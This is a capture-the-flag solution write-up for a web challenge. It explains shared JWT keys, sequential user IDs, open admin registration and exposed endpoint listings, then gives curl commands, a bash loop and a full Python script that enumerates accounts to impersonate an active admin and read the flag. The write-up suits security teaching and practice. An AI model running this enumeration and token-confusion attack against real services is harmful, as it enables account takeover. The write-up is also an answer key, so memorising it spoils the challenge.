# Hard - Enumeration

<!--------------------------------------------------------------------------->

## Vulnerabilities:

This challenge has multiple vulnerabilities, and needs alot of exploration before a solid exploit can be conducted.

The challenge has an express server that is filled with lots of dummy enpoints, and a bit of vulnerable authentication systems.

### Vulnerability 1:

The JWT Key between the two distinct parts of the sites are shared, and can easily be confused by the system. There is nothing to distinguish the admin and user jwts, and both can unfortunately be used for each other.

### Vulnerability 2:

Enumerating UserIDs. God save anyone that needs to wonder why this is an issue, always use uuids, and randomly generated IDs for this sort of stuff.


```bash
# First registration
POST /api/admin/register
{"username":"user1@test.com","password":"pass1"}
# Returns: userId 7 (6 existing + 1)

# Second registration  
POST /api/admin/register
{"username":"user2@test.com","password":"pass2"}
# Returns: userId 8

# Continue until userId 15...
```

### Vulnerability 3:

The JWT token was not scoped enough. It only signed the object `{ "userId": number }`, and no other information was stored in it to make it more verifyable, which meant that a user with ID 7 could easily authenticate as an admin with ID 7 since the IDs were already enumerated.

```json
{
  "userId": 7
}
```
No role, no user type, no token scope. Just a number that can overlap between systems.

### Vulnerability 3:

The admin accounts let anyone register, and also register without a domain restriction, this is not ideal.

### Vulnerability 4:

No endpoint obfuscation, the /api endpoint shows every single endpoint available in the system including admin ones.

```bash
curl http://localhost:3000/api
```

**Response:**
```json
{
  "message": "Welcome to the API",
  "endpoints": {
    "admin_functions": {
      "GET /api/admin/users": "List all admin users (requires admin authentication)",
      "POST /api/admin/settings": "Update system settings (requires admin authentication)",
      ...
    }
  }
}
```

<!--------------------------------------------------------------------------->

## Intended solution route:

- When you first open the site, you'll be greeted with a login page, and you can neither log in or register due to domain restrictions.

- Exploring around a bit, you can find a /robots.txt file which indicates that there are some admin routes.

```bash
User-agent: *
Disallow: /admin-dashboard
Disallow: /dev-panel
```

- Go to the admin routes, and apparently you can register without a domain restriction. Although, the admin site is under maintenance.

- Intercepting packets using Burp Suite or other tools show that you have the ID 7, which probably means the IDs are enumerated. Also, there's a cookie set for authorization with the /api/admin/me endpoint.

```bash
# Check what cookie was set
cat cookies.txt
# dev-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjd9.xxx

# Decode the JWT payload (base64 decode the middle part):
echo "eyJ1c2VySWQiOjd9" | base64 -d
# {"userId":7}

# Access admin endpoint
curl -b cookies.txt http://localhost:3000/api/admin/me

# Response:
{"userId":7,"username":"attacker@test.com","authenticated":true}
```

- If you resend this request with the /api/me endpoint instead, you see that due to a flaw in the JWT you can see the information for another user from the main app with the same ID.

```bash
# Use the same cookie but hit /api/me instead
curl -b cookies.txt http://localhost:3000/api/me

# Response:
{
  "userId": 7,
  "username": "auren@domain.com",
  "role": "admin",
  "enabled": false,
  "flag": "this account is disabled"
}
```

- This user is also an admin, but the account is deactivated, and there's a flag property on the user that shows that admins have flags, but only activated admins. We now know need a signed JWT with the ID of an active admin account to get the flag

- Sending a request to /api shows all the available endpoints

```bash
curl http://localhost:3000/api | jq .

# Response shows:
{
  "endpoints": {
    "user_management": {
      "POST /api/users": "Get all users (requires authentication)",
      ...
    }
  }
}
```

- From there, you can see there's a /api/users endpoint that requires an admin account, and it shows all the users. Here you can see that userId 15 is an admin that has an active account.

```bash
# First, need to get admin access. Since userId 7 in mainAppUsers is admin,
# we can use our userId 7 token:
curl -X POST -b cookies.txt http://localhost:3000/api/users

# Response:
{
  "users": [
    {"userId": 1, "username": "jasper@domain.com", "role": "user", "enabled": true},
    ...
    {"userId": 15, "username": "activeadmin@domain.com", "role": "admin", "enabled": true},
    ...
  ]
}
```

- You can now use a script or repeater to provision 9 more accounts on the dev panel to get a signed JWT with the ID 15 in it.

```bash
#!/bin/bash
# Register accounts until we get userId 15
# We already have userId 7, so we need 8 more (7 + 8 = 15)

for i in {1..8}; do
  curl -X POST http://localhost:3000/api/admin/register \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$i@test.com\",\"password\":\"pass\"}" \
    -c "temp_cookies_$i.txt"
done

# The last registration will have userId 15
# Save that cookie
cp temp_cookies_8.txt final_cookie.txt
```

**Or using Burp Repeater:**
1. Send registration request 8 more times
2. Each time, the userId increments
3. Keep track of which registration gives you userId 15
4. Save the cookie from that registration

- Use /api/me with this cookie again, and you finally get the flag.

```bash
# Use the cookie with userId 15
curl -b final_cookie.txt http://localhost:3000/api/me

# Response:
{
  "userId": 15,
  "username": "activeadmin@domain.com",
  "role": "admin",
  "enabled": true,
  "flag": "CSL{your_flag_here}"
}
```

## Complete Exploit Script:

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:3000"

# Step 1: Register initial admin account
print("[+] Registering initial admin account...")
r = requests.post(f"{BASE_URL}/api/admin/register", json={
    "username": "test@test.com",
    "password": "test123"
})
print(f"[+] Got cookie: {r.cookies.get('dev-token')}")

# Step 2: Check what userId we got
r = requests.get(f"{BASE_URL}/api/admin/me", cookies=r.cookies)
data = r.json()
current_id = data['userId']
print(f"[+] Initial userId: {current_id}")

# Step 3: Register until we get userId 15
target_id = 15
needed = target_id - current_id
print(f"[+] Need to register {needed} more accounts...")

for i in range(needed):
    r = requests.post(f"{BASE_URL}/api/admin/register", json={
        "username": f"enum{i}@test.com",
        "password": f"pass{i}"
    })
    cookies = r.cookies

# Step 4: Verify we have userId 15
r = requests.get(f"{BASE_URL}/api/admin/me", cookies=cookies)
data = r.json()
print(f"[+] Final userId: {data['userId']}")

# Step 5: Use /api/me to get the flag
r = requests.get(f"{BASE_URL}/api/me", cookies=cookies)
flag_data = r.json()
print(f"[+] Flag: {flag_data.get('flag')}")
```